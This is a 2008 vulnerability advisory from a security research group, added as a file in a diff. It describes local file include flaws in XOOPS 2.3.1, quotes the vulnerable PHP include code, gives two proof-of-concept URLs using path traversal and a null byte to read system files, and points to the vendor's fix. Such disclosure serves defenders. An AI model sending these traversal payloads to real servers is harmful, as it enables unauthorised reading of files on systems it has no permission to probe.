@@ -1,0 +1,86 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-040
+
+
+Application:                    XOOPS   
+Versions Affected:              2.3.1
+Vendor URL:                     http://www.xoops.org/
+Bug:                            Multiple Local File Include
+Exploits:                       YES
+Reported:                       10.11.2008
+Vendor response:                10.11.2008
+Solution:                       YES
+Date of Public Advisory:        08.12.2008
+Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+XOOPS has Multiple Local File Include vulnerabilities.
+
+
+
+Details
+*******
+
+Local File Include vulnerability found in scripts:
+
+xoops_lib/modules/protector/blocks.php
+xoops_lib/modules/protector/main.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code
+----
+#################################################
+
+$mytrustdirname = basename( dirname( __FILE__ ) ) ;
+$mytrustdirpath = dirname( __FILE__ ) ;
+
+// language files
+$language = empty( $xoopsConfig['language'] ) ? 'english' : $xoopsConfig['language'] ;
+if( file_exists( "$mydirpath/language/$language/main.php" ) ) {
+        // user customized language file (already read by common.php)
+        // include_once "$mydirpath/language/$language/main.php" ;
+} else if( file_exists( "$mytrustdirpath/language/$language/main.php" ) ) {
+        // default language file
+        include_once "$mytrustdirpath/language/$language/main.php" ;
+...
+
+#################################################
+
+For successful exploitation first condition in if..else statement must be not true.
+
+Example:
+
+http://[server]/[installdir]/xoops_lib/modules/protector/blocks.php?mydirpath=DSecRG/DSecRG/DSecRG&xoopsConfig[language]=../../../../../../../boot.ini%00
+http://[server]/[installdir]/xoops_lib/modules/protector/main.php?mydirpath=DSecRG/DSecRG/DSecRG&xoopsConfig[language]=../../../../../../../boot.ini%00
+
+
+
+Solution
+********
+
+Vendor fixed this flaw on 26.11.2008. 
+
+XOOPS 2.3.2a Security Release can be download from Sourceforge repository:
+
+https://sourceforge.net/project/showfiles.php?group_id=41586&package_id=153583&release_id=643010
+
+Release notes:
+
+http://www.xoops.org/modules/news/article.php?storyid=4540
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-12-08]
